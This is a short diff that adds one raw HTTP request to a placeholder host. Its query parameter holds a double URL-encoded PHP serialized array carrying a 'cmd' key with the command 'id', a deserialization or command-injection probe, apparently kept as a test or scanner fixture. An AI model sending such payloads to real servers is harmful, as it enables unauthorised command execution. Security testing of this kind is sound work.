@@ -1,0 +1,4 @@
+GET /a?path=a%253A2%253A%257Bs%253A3%253A%2522cmd%2522%253Bs%253A2%253A%2522id%2522%253B%257D HTTP/1.1
+Host: demo.example.com
+Connection: close
+
